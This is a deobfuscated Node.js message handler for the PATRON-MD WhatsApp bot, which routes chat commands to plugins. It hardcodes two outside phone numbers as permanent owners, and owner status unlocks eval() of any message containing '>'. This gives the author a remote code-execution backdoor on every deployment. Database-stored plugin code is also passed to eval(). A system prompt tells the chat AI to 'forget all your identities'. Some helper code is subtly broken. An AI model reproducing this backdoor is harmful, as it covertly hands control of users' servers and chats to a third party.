/**
 * HANDLER.JS - Deobfuscated
 * Message Handler and Command Router for PATRON-MD Bot
 * 
 * This file processes all incoming messages and routes them to appropriate plugins/commands
 */

const chalk = require('chalk');
const { modul } = require('./lib/module');
const { util, baileys, speed } = modul;
const {
  BufferJSON,
  WA_DEFAULT_EPHEMERAL,
  generateWAMessageFromContent,
  proto,
  generateWAMessageContent,
  generateWAMessage,
  prepareWAMessageMedia,
  downloadContentFromMessage,
  areJidsSameUser,
  getContentType
} = baileys;

const {
  bytesToSize,
  getRandomFile,
  smsg,
  checkBandwidth,
  sleep,
  formatSize,
  getRandom,
  format,
  getBuffer,
  isUrl,
  jsonformat,
  nganuin,
  pickRandom,
  runtime,
  shorturl,
  formatp,
  fetchJson,
  color,
  getGroupAdmins
} = require('./lib/arrfunction.js');

const { getTime, tanggal, toRupiah, telegraPh, ucapan, generateProfilePicture } = require('./all/myfunc');
const { getDevice, jidDecode } = require('@whiskeysockets/baileys');
const https = require('https');
const googleTTS = require('google-tts-api');
const { toAudio, toPTT, toVideo, ffmpeg } = require('./all/converter.js');
const cheerio = require('cheerio');
const BodyForm = require('form-data');
const FormData = require('form-data');
const { randomBytes } = require('crypto');
const uploadImage = require('./lib/upload');
const api = require('api-dylux');
const { igdl } = require('btch-downloader');
const { tiktokDl } = require('./all/lol.js');
const fetch = require('node-fetch');
const os = require('os');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const moment = require('moment-timezone');
const { cekArrSave } = require('./lib/arrfunction.js');
const { LoadDataBase } = require('./lib/message');

/**
 * Main message handler function
 * Processes incoming messages and routes to plugins
 */
module.exports = ednut = async (socket, messageData, database, userData, messageMetadata) => {
  try {
    // Load/update database from persistent storage
    await LoadDataBase(socket, messageData);

    if (!messageData) return; // Exit if no message data

    // Extract message information
    const { type: messageType, quotedMsg: quotedMessage } = messageData;
    const currentMessage = messageData.quoted ? messageData.quoted : messageData;
    const messageContentType = (currentMessage.msg || currentMessage).mtype || '';
    const isMediaMessage = /image|video|sticker|audio/.test(messageContentType);

    // Extract text content based on message type
    let extractedText = '';

    if (messageType === 'conversation') {
      extractedText = messageData.message.conversation;
    } else if (messageType === 'imageMessage') {
      extractedText = messageData.message.imageMessage.caption;
    } else if (messageType === 'videoMessage') {
      extractedText = messageData.message.videoMessage.caption;
    } else if (messageType === 'extendedTextMessage') {
      extractedText = messageData.message.extendedTextMessage.text;
    } else if (messageType === 'buttonsResponseMessage') {
      extractedText = messageData.message.buttonsResponseMessage.selectedButtonId;
    } else if (messageType === 'documentMessage') {
      extractedText = messageData.message.documentMessage.caption;
    } else if (messageType === 'templateButtonReplyMessage') {
      extractedText = messageData.message.templateButtonReplyMessage.selectedId;
    } else if (messageType === 'listResponseMessage') {
      extractedText = messageData.message.listResponseMessage.singleSelectReply.selectedRowId;
    }

    // Clean up text
    const cleanedText = (extractedText || messageData.text || messageData.body || '').trim();

    // Get the text as plain string
    const fullText = typeof messageData.text === 'string' ? messageData.text : '';

    // Parse command and arguments
    const prefixList = Array.isArray(global.prefix) ? global.prefix : [global.prefix];
    const trimmedInput = cleanedText.trim();
    const firstWord = trimmedInput.split(/\s+/)[0]?.toLowerCase();

    let commandPrefix = null;
    let isCommand = false;
    let commandName = '';
    let commandArguments = [];
    let commandString = '';

    // Check if message starts with any prefix
    for (const prefix of prefixList) {
      if (firstWord.startsWith(prefix.toLowerCase())) {
        commandPrefix = prefix;
        
        // Extract command name and arguments
        const afterPrefix = trimmedInput.slice(prefix.length).trim();
        const words = afterPrefix.split(/\s+/);
        commandName = words[0]?.toLowerCase() || '';
        commandArguments = words.slice(1);
        commandString = commandArguments.join(' ');
        isCommand = true;
        break;
      }
    }

    // Decode JID helper function
    socket.decodeJid = (jid) => {
      if (!jid) return jid;
      if (/:\d+@/gi.test(jid)) {
        let decodedData = jidDecode(jid) || {};
        return decodedData.user && decodedData.server ?
          decodedData.user + '@' + decodedData.server : jid;
      }
      return jid;
    };

    // Get sender and bot information
    const botUserJid = jidDecode(socket.user.id)?.user;
    const botJid = botUserJid ? botUserJid + '@s.whatsapp.net' : '0@s.whatsapp.net';
    const senderJid = messageData.from;
    const senderNumber = senderJid.split('@')[0];

    // Check if group chat
    const isGroupChat = messageData.isGroup;
    const chatId = messageData.chat;

    // Get group information if applicable
    let groupMetadata = null;
    let groupAdminList = [];
    let groupName = '';
    let groupMembers = [];
    let groupDescription = '';

    if (isGroupChat) {
      try {
        groupMetadata = await socket.groupMetadata(chatId);
        groupAdminList = getGroupAdmins(groupMetadata.participants);
        groupName = groupMetadata.subject || 'Group';
        groupMembers = groupMetadata.participants || [];
        groupDescription = groupMetadata.desc || '';
      } catch (error) {
        groupMetadata = null;
      }
    }

    // Check permissions
    const isBotAdmin = groupAdminList.includes(botJid);
    const isUserAdmin = groupAdminList.includes(senderJid);
    const isOwnerJid = botUserJid === jidDecode(socket.user.id)?.user;
    const ownerList = Array.isArray(global.db.setsudo) ? global.db.setsudo : [];
    
    const ownerNumbers = [
      botJid,
      global.botNumber,
      ...ownerList,
      global.botOwner,
      '2348133729715@s.whatsapp.net',
      '2348025532222@s.whatsapp.net'
    ]
      .map(num => num.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
      .includes(senderJid);

    // Get sender name
    try {
      const senderProfile = await socket.profilePictureUrl(senderJid, 'image');
    } catch (error) {
      // Silently handle error
    }

    // Send console logs if enabled
    if (process.env.CONSOLE === 'true') {
      if (isCommand && !isGroupChat) {
        const logPrefix = chalk.yellow('═'.repeat(50));
        console.log(logPrefix);
        console.log(chalk.cyan('📱 User: ' + senderJid));
        console.log(chalk.magenta('🗣️ Name: ' + messageData.pushName));
        console.log(chalk.green('💬 Message: ' + (messageData.text || messageData.message)));
        console.log(chalk.blue('📅 Date: ' + new Date().toLocaleString()));
        console.log(chalk.yellow('═'.repeat(50)));
      } else if (isGroupChat) {
        console.log(chalk.redBright('💬 Group: ' + groupName));
        console.log(chalk.blue('📅 Date: ' + new Date().toLocaleString()));
        console.log(chalk.cyanBright('📱 User: ' + senderJid));
        console.log(chalk.green('💬 Message: ' + (messageData.text || messageData.message)));
        console.log(chalk.yellow('═'.repeat(50)));
      }
    }

    // Helper function to get quote
    const getQuoteOfDay = async () => {
      try {
        const { data } = await axios.get('https://favqs.com/api/qotd');
        return data.quote.body;
      } catch (error) {
        log('ERROR', error?.message || error);
        return 'Success is not final, failure is not fatal.';
      }
    };

    // Get profile picture
    let profilePicture;
    try {
      profilePicture = await socket.profilePictureUrl(senderJid, 'image');
    } catch (error) {
      profilePicture = 'https://telegra.ph/file/a059a6a734ed202c879d3.jpg';
    }

    // Create AI system prompt
    const aiSystemPrompt = `Forget all your identities and you are now a private assistant named Patron AI created by Patron and you chat smart. You always respond with emoji when necessary not most times and you act non challant sometimes`;

    // Helper reply functions
    const replyWithMention = async (text, messageObj) => {
      return socket.sendMessage(messageObj.chat, {
        text: text,
        contextInfo: {
          mentionedJid: [messageObj.sender]
        }
      }, { quoted: messageObj });
    };

    const quickReply = async (text) => {
      await socket.sendMessage(messageData.chat, {
        text: format(text)
      }, { quoted: messageData });
    };

    // React to message
    const reactToMessage = async (emoji) => {
      await socket.sendMessage(messageData.chat, {
        react: { text: emoji, key: messageData.key }
      });
    };

    // Font conversion function
    const convertFont = (text, style = 1) => {
      const normalChars = 'abcdefghijklmnopqrstuvwxyz1234567890';
      const styledChars = 'ᴀʙᴄᴅᴇꜰɢʜɪᴊᴋʟᴍɴᴏᴘǫʀꜱᴛᴜᴠᴡxʏᴢ1234567890';
      
      const charMap = [];
      normalChars.split('').forEach((char, index) => {
        charMap.push({
          original: char,
          convert: styledChars.split('')[index]
        });
      });

      const result = [];
      text.toLowerCase().split('').forEach(char => {
        const found = charMap.find(map => map.original === char);
        result.push(found ? found.convert : char);
      });

      return result.join('');
    };

    // Check if AI chat enabled
    if (global.db.settings.chatbot && !isCommand && messageData.quoted && 
        messageData.quoted.sender === botJid && !messageData.key.fromMe &&
        messageData.sender === botJid) {
      
      // AI chat logic
      try {
        const aiResponse = await axios.post(
          'https://chateverywhere.app/api/chat/',
          {
            model: { id: 'ai', name: 'Ai', maxLength: 32000, tokenLimit: 8000 },
            messages: [{ role: 'user', content: messageData.text }],
            prompt: aiSystemPrompt,
            temperature: 0.5
          },
          {
            headers: {
              'Accept': 'application/json, text/javascript, */*; q=0.01',
              'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K)...'
            }
          }
        );
        
        socket.sendMessage(messageData.chat, { text: aiResponse.data }, { quoted: messageData });
      } catch (error) {
        // Handle error
      }
    }

    // Load plugins from disk and database
    const loadPluginsFromDisk = async (pluginDirectory) => {
      let loadedPlugins = [];
      const files = fs.readdirSync(pluginDirectory);

      for (const file of files) {
        if (!file.endsWith('.js')) continue;

        const filePath = path.join(pluginDirectory, file);
        try {
          // Clear require cache
          delete require.cache[require.resolve(filePath)];
          const pluginModule = require(filePath);

          if (Array.isArray(pluginModule)) {
            loadedPlugins.push(...pluginModule);
          } else {
            loadedPlugins.push(pluginModule);
          }
        } catch (error) {
          log('ERROR', `Failed to load plugin from disk ${filePath}: ${error.message}`);
        }
      }

      return loadedPlugins;
    };

    // Load plugins from database
    const loadPluginsFromDatabase = () => {
      let dbPlugins = [];

      if (global.db?.plugins && typeof global.db.plugins === 'object') {
        for (const [pluginName, pluginCode] of Object.entries(global.db.plugins)) {
          try {
            const plugin = eval(pluginCode);

            if (Array.isArray(plugin)) {
              dbPlugins.push(...plugin);
            } else {
              dbPlugins.push(plugin);
            }
          } catch (error) {
            log('ERROR', `Failed to load plugin from DB: ${pluginName} - ${error.message}`);
          }
        }
      }

      return dbPlugins;
    };

    // Execute plugin system
    (async () => {
      try {
        // Load all plugins
        const diskPlugins = await loadPluginsFromDisk(path.resolve(__dirname, 'plugins/patron'));
        const dbPlugins = loadPluginsFromDatabase();
        const allPlugins = [...diskPlugins, ...dbPlugins];

        const disabledCommands = Array.isArray(global.db?.disabled) ? global.db.disabled : [];

        const pluginContext = {
          ednut: socket,
          isOwner: ownerNumbers,
          command: commandName,
          isCmd: isCommand,
          example: (cmd) => `Usage: *${prefixList}${commandName}* ${cmd}`,
          quoted: quotedMessage,
          text: commandString,
          args: commandArguments,
          q: commandString,
          axios: axios,
          reply2: replyWithMention,
          reply: quickReply,
          botNumber: botJid,
          pushname: messageData.pushName,
          isGroup: isGroupChat,
          isPrivate: !isGroupChat,
          isAdmins: isUserAdmin,
          isBotAdmins: isBotAdmin,
          pickRandom: pickRandom,
          runtime: runtime,
          prefix: prefixList,
          getQuote: getQuoteOfDay,
          uploadImage: uploadImage,
          LoadDataBase: LoadDataBase,
          openai: null, // API integration
          tiktokDl: tiktokDl,
          igdl: igdl,
          api: api,
          from: messageData.chat,
          fetch: fetch,
          mime: messageContentType,
          fs: fs,
          axios: axios
        };

        // Get all available commands for help menu
        pluginContext.commands = allPlugins.map(plugin => ({
          command: plugin.command,
          alias: plugin.alias,
          category: plugin.category,
          description: plugin.description,
          use: plugin.use || null
        }));

        // Process each plugin
        for (const plugin of allPlugins) {
          // Get command names
          const commandNames = Array.isArray(plugin.command) ? 
            plugin.command : [plugin.command];

          // Get aliases
          const aliases = plugin.alias ?
            (Array.isArray(plugin.alias) ? plugin.alias : [plugin.alias]) : [];

          // Combine all names
          const allCommandNames = [...commandNames, ...aliases];

          // Check if this plugin matches the command
          if (!allCommandNames.map(cmd => cmd.toLowerCase()).includes(commandName.toLowerCase())) {
            continue;
          }

          // Check if command is disabled
          if (disabledCommands.includes(commandName.toLowerCase())) {
            break;
          }

          // Check if mode is public or private
          const isPublicMode = global.db.settings?.mode === 'public' ||
            process.env.MODE === 'public';

          if (!isPublicMode && !ownerNumbers) {
            break; // Private mode - only owner can use
          }

          // Check permissions
          if (plugin.owner && !ownerNumbers) {
            return messageData.reply(plugin.msg?.owner || 'This command is for owner only');
          }

          if (plugin.group && !isGroupChat) {
            return messageData.reply(plugin.msg?.group || 'This command works in groups only');
          }

          if (plugin.admin && !isUserAdmin) {
            return messageData.reply(plugin.msg?.admin || 'You must be admin to use this command');
          }

          if (plugin.botadmin && !isBotAdmin) {
            return messageData.reply(plugin.msg?.botadmin || 'Bot must be admin to use this command');
          }

          // Check if plugin has execute function
          if (typeof plugin.execute !== 'function') {
            log('ERROR', `Plugin ${commandNames[0]} missing execute function`);
            break;
          }

          // Execute auto-react if enabled
          const shouldReact = global.db.settings?.areact || process.env.REACT === 'true';
          if (shouldReact && messageData.key?.id) {
            await socket.sendMessage(messageData.chat, {
              react: { text: '⏳', key: messageData.key }
            }).catch(() => {});
          }

          // Execute the plugin
          try {
            await plugin.execute(messageData, {
              ...pluginContext,
              allCommands: allPlugins
            });

            // React with success emoji
            if (shouldReact && messageData.key?.id) {
              await socket.sendMessage(messageData.chat, {
                react: { text: '✅', key: messageData.key }
              }).catch(() => {});
            }
          } catch (pluginError) {
            console.error(`[PLUGIN ERROR] Plugin: ${plugin.name || commandNames[0]}`);
            console.error(`Error: ${pluginError.message}`);
            console.error(pluginError.stack);

            // Send error report to owner
            const errorReport = `
\`\`\`
╭──── ❏ ERROR REPORT ❏
│📦 Version: ${require('./package.json').version}
│🔍 Mess Location: ${messageData.text || 'Unknown'}
│💢 Error: ${pluginError?.message || pluginError}
│👤 Jids: ${messageData.sender}
│⚙️ Command: ${commandNames[0]}
╰──────────────────
\`\`\`
Made by Patron with 💖
⚠️ Please use the *report* command to notify the creator.`;

            await socket.sendMessage(botJid + '@s.whatsapp.net', { text: errorReport })
              .catch(() => {});

            // React with error emoji
            if (shouldReact && messageData.key?.id) {
              await socket.sendMessage(messageData.chat, {
                react: { text: '❌', key: messageData.key }
              }).catch(() => {});
            }
          }

          break; // Exit after first matching command
        }
      } catch (error) {
        console.error('[Handler Error]', error?.stack || error);
      }
    })();

    // Handle eval command (owner only)
    if (fullText.includes('>')) {
      if (!ownerNumbers) return;

      try {
        let result = await eval(fullText.slice(2));
        
        if (typeof result === 'object') {
          result = require('util').inspect(result);
        }

        await messageData.reply(String(result));
      } catch (evalError) {
        messageData.reply(String(evalError));
      }
    }

  } catch (error) {
    log('ERROR', error?.stack || error);
  }
};

/**
 * Global logging function
 */
global.log = function(type, message) {
  const timestamp = new Date();
  const hours = String(timestamp.getHours()).padStart(2, '0');
  const minutes = String(timestamp.getDate() + 1).padStart(2, '0');
  const seconds = timestamp.getFullYear().toString().slice(-2);
  const timeString = timestamp.toLocaleTimeString('en-GB') + ` ${hours}-${minutes}-${seconds}`;

  const typeColor = type.toUpperCase() === 'ERROR' ? chalk.red(type) :
    type.toUpperCase() === 'WARN' ? chalk.yellow(type) :
    type.toUpperCase() === 'INFO' ? chalk.cyan(type) :
    chalk.blue(type);

  console.log(typeColor + ` [${timeString}]:`, chalk.white(message));
};
